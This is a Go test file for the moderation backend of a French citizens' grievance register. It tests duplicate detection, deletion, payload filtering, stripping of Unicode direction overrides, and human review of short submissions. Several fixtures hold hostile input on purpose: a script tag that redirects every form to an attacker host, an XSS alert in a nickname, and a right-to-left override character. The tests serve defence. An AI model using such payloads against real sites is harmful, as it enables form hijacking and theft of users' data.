package backend

import (
	"context"
	"strings"
	"testing"

	"github.com/CoderSyndicate/doleances/internal/llm"
	"github.com/CoderSyndicate/doleances/internal/models"
)

// longText builds a doléance past the length floor, so the duplicate check
// applies to it.
func longText(subject string) string {
	text := "La maternité de " + subject + " a fermé en mars et il faut désormais " +
		"faire soixante-dix kilomètres pour accoucher, sur une route qui n'est pas " +
		"déneigée l'hiver. Personne ne nous a demandé notre avis."
	if len([]rune(text)) < duplicateOfFloorRunes {
		panic("the fixture is shorter than the floor")
	}
	return text
}

func submit(t *testing.T, a *API, text, nickname string) models.Message {
	t.Helper()

	message := models.Message{
		Text:     text,
		Nickname: nickname,
		Status:   models.StatusPending,
	}
	if original := a.duplicateOf(context.Background(), text); original != "" {
		message.Status = models.StatusDropped
		message.DuplicateOf = original
	}
	if err := a.store.CreateMessage(context.Background(), &message); err != nil {
		t.Fatalf("CreateMessage: %v", err)
	}
	return message
}

// TestTheSameTextUnderAnotherNameIsDropped is the flood this guards against:
// valid content, which every classifier would accept, posted again and again
// under different names and sessions. Nothing about the text is wrong, so
// nothing downstream would stop it.
func TestTheSameTextUnderAnotherNameIsDropped(t *testing.T) {
	a := newAPI(t)
	text := longText("Saint-Jean")

	first := submit(t, a, text, "Camille")
	if first.Status != models.StatusPending {
		t.Fatalf("the first submission was %q, want pending", first.Status)
	}

	// Different name, different session, different line wrapping and casing —
	// the same doléance.
	variants := []string{
		text,
		strings.ToUpper(text),
		strings.ReplaceAll(text, " ", "\n"),
		"   " + text + "   ",
	}
	for i, variant := range variants {
		repeat := submit(t, a, variant, "quelqu'un d'autre")
		if repeat.Status != models.StatusDropped {
			t.Errorf("variant %d was %q, want dropped before assessment", i, repeat.Status)
		}
		// Every copy points at the original rather than at the copy before it,
		// so a curator sees one conversation and not a chain.
		if repeat.DuplicateOf != first.ID {
			t.Errorf("variant %d points at %q, want the first submission", i, repeat.DuplicateOf)
		}
	}
}

// TestADifferentGrievanceIsNotADuplicate: the register exists because the same
// complaint recurs place after place. A guard that called two different
// doléances one would be deleting exactly the signal it is built to collect.
func TestADifferentGrievanceIsNotADuplicate(t *testing.T) {
	a := newAPI(t)

	submit(t, a, longText("Saint-Jean"), "Camille")

	// Same structure, same complaint, different place — which is the pattern
	// the register is for.
	elsewhere := submit(t, a, longText("Bayonne"), "Dominique")
	if elsewhere.Status != models.StatusPending {
		t.Errorf("a different doléance was %q, want it treated as new", elsewhere.Status)
	}
	if elsewhere.DuplicateOf != "" {
		t.Error("a different doléance was recorded as a repeat of another")
	}
}

// TestShortTextEscapesTheDuplicateCheck: two strangers reaching for the same
// sentence is credible and is the register working. The floor is what keeps
// this guard from quietly collapsing that into one voice.
func TestShortTextEscapesTheDuplicateCheck(t *testing.T) {
	a := newAPI(t)
	short := "Les services publics disparaissent."

	submit(t, a, short, "Camille")
	echo := submit(t, a, short, "Dominique")

	if echo.Status != models.StatusPending {
		t.Errorf("a short echo was %q, want it to reach the classifier like any other", echo.Status)
	}
}

// TestDeletingFreesTheTextAgain: deletion is real deletion, and a hash that
// outlived the message would silently stop its author ever writing it again —
// a record of something we promised not to keep.
func TestDeletingFreesTheTextAgain(t *testing.T) {
	a := newAPI(t)
	text := longText("Saint-Jean")

	first := submit(t, a, text, "Camille")
	if err := a.store.DB().Delete(&models.Message{}, "id = ?", first.ID).Error; err != nil {
		t.Fatalf("delete: %v", err)
	}

	again := submit(t, a, text, "Camille")
	if again.Status != models.StatusPending {
		t.Errorf("status = %q, want the text free to be written again", again.Status)
	}
}

// TestADuplicateIsIndistinguishableToItsAuthor. The receipt reports pending
// whatever happened, because an honest answer tells a flooder which of their
// variants got through — turning the guard into a tuning instrument for the
// thing it guards against.
func TestADuplicateIsIndistinguishableToItsAuthor(t *testing.T) {
	a := newAPI(t)
	ctx := context.Background()
	text := longText("Saint-Jean")

	accepted := submitThroughAPI(t, a, ctx, text)
	repeated := submitThroughAPI(t, a, ctx, text)

	if accepted.Body.Status != repeated.Body.Status {
		t.Errorf("a duplicate answered %q where an original answered %q",
			repeated.Body.Status, accepted.Body.Status)
	}
	if repeated.Body.Status != string(models.StatusPending) {
		t.Errorf("status = %q, want pending", repeated.Body.Status)
	}
	// The identifier and the token are real: the contributor can still delete
	// what they wrote, which is the one promise that must not be faked.
	if repeated.Body.ID == "" || repeated.Body.Token == "" {
		t.Error("a duplicate was answered with no identifier or no deletion token")
	}
	if repeated.Body.ID == accepted.Body.ID {
		t.Error("the duplicate was answered with the original's identifier")
	}
	if repeated.Body.Token == accepted.Body.Token {
		t.Error("the duplicate was handed the original's deletion token")
	}
}

func submitThroughAPI(t *testing.T, a *API, ctx context.Context, text string) *MessageReceipt {
	t.Helper()

	in := &MessageSubmission{}
	in.Body.Text = text
	in.Body.Agreement = true

	receipt, err := a.submitMessage(ctx, in)
	if err != nil {
		t.Fatalf("submitMessage: %v", err)
	}
	return receipt
}

// TestPayloadIsRefusedBeforeTheClassifier: the whole submission goes, not the
// tag. Stripping the payload and publishing the rest would mean an attacker
// gets their text into the register every time and loses only the tag.
func TestPayloadIsRefusedBeforeTheClassifier(t *testing.T) {
	a := newAPI(t)
	ctx := context.Background()

	// A real grievance with a payload buried in it — the convincing case, and
	// the one that must not be treated as mitigated by its surroundings.
	receipt := submitThroughAPI(t, a, ctx, "La ligne de bus 14 a été supprimée en septembre. "+
		"Pour aller à l'hôpital il faut deux correspondances et deux heures.\n"+
		"<script>document.querySelectorAll('form').forEach(f=>f.action='https://attacker.example')</script>\n"+
		"Je demande qu'on rétablisse un passage le matin et un le soir.")

	stored, err := a.store.GetMessage(ctx, receipt.Body.ID)
	if err != nil {
		t.Fatalf("GetMessage: %v", err)
	}
	if stored.Status != models.StatusDropped {
		t.Errorf("status = %q, want dropped before any classifier saw it", stored.Status)
	}
	if stored.DropReason != models.DropPayload {
		t.Errorf("drop reason = %q, want %q", stored.DropReason, models.DropPayload)
	}
	// The text is kept exactly as sent: the dropped sample is where a curator
	// checks whether the filter is eating real doléances, and a redacted
	// specimen cannot answer that.
	if !strings.Contains(stored.Text, "<script>") {
		t.Error("the submission was edited rather than refused")
	}
	// And the author is told nothing, as with a duplicate.
	if receipt.Body.Status != string(models.StatusPending) {
		t.Errorf("status = %q, want pending", receipt.Body.Status)
	}
}

// TestPayloadInANicknameIsRefusedToo: a nickname and an activity are printed
// beside the text on every card. An attack does not care which box it arrived
// in.
func TestPayloadInANicknameIsRefusedToo(t *testing.T) {
	a := newAPI(t)
	ctx := context.Background()

	in := &MessageSubmission{}
	in.Body.Text = longText("Saint-Jean")
	in.Body.Nickname = "<script>alert('xss')</script>"
	in.Body.Agreement = true

	receipt, err := a.submitMessage(ctx, in)
	if err != nil {
		t.Fatalf("submitMessage: %v", err)
	}

	stored, err := a.store.GetMessage(ctx, receipt.Body.ID)
	if err != nil {
		t.Fatalf("GetMessage: %v", err)
	}
	if stored.Status != models.StatusDropped || stored.DropReason != models.DropPayload {
		t.Errorf("status = %q reason = %q, want a payload drop",
			stored.Status, stored.DropReason)
	}
}

// TestInvisibleCharactersNeverReachTheRegister. The register's worth is being
// a faithful record, so text that displays differently from what it stores is
// worse than an escaped script tag — the tag is inert, this is not.
func TestInvisibleCharactersNeverReachTheRegister(t *testing.T) {
	a := newAPI(t)
	ctx := context.Background()

	receipt := submitThroughAPI(t, a, ctx,
		"Je soutiens \u202e la fermeture de l'hôpital \u202c entièrement, "+
			"et je le dis depuis des années à qui veut bien l'entendre dans ce village.")

	stored, err := a.store.GetMessage(ctx, receipt.Body.ID)
	if err != nil {
		t.Fatalf("GetMessage: %v", err)
	}
	if strings.ContainsAny(stored.Text, "\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069") {
		t.Error("a directional override was stored and will reorder the register's own text")
	}
	// Refused? No — nothing was attacked and nothing was lost. The doléance is
	// assessed like any other.
	if stored.Status != models.StatusPending {
		t.Errorf("status = %q, want the doléance to go on to assessment", stored.Status)
	}
}

// TestBriefSubmissionsReachAHumanFirst.
//
// The register's rule is that length is not a signal, and it means it: a
// filter that treats terseness as suspicion refuses exactly the people least
// used to being asked to write. So this withholds publication-without-review,
// never publication — the doléance goes to a curator, not to the spam pile.
func TestBriefSubmissionsReachAHumanFirst(t *testing.T) {
	a := newAPI(t)
	ctx := context.Background()

	settings := models.LLMSettings{}.WithThresholdDefaults()
	settings.AcceptThreshold = 90
	settings.CurateThreshold = 45

	store := func(text string) models.Message {
		message := models.Message{Text: text, Status: models.StatusPending, TokenHash: "h"}
		if err := a.store.CreateMessage(ctx, &message); err != nil {
			t.Fatalf("CreateMessage: %v", err)
		}
		return message
	}

	// The case from the register: a complete grievance from somebody with no
	// car, scored 95 by the model.
	brief := store("Le bus ne passe plus le dimanche.")
	status := a.applyAssessment(ctx, brief, llm.Assessment{Score: 95}, settings)
	if status != models.StatusCurating {
		t.Errorf("status = %q, want curating — too short to publish unread", status)
	}

	// And it is a *delay*, not a refusal. Nothing about brevity sends a
	// doléance to the dropped pile.
	if status == models.StatusDropped {
		t.Error("brevity refused a doléance outright")
	}

	// A doléance with something to say publishes as before.
	long := store("La maternité de mon canton a fermé en 2019. Depuis, c'est une heure de " +
		"route pour accoucher. Cet hiver deux femmes ont accouché sur le bord de la route.")
	status = a.applyAssessment(ctx, long, llm.Assessment{Score: 95}, settings)
	if status != models.StatusAccepted {
		t.Errorf("status = %q, want accepted", status)
	}

	// A short submission the model actually rejected still drops: the floor
	// only ever withholds acceptance, it never rescues anything.
	junk := store("test test 123")
	status = a.applyAssessment(ctx, junk, llm.Assessment{Score: 10}, settings)
	if status != models.StatusDropped {
		t.Errorf("status = %q, want dropped", status)
	}
}
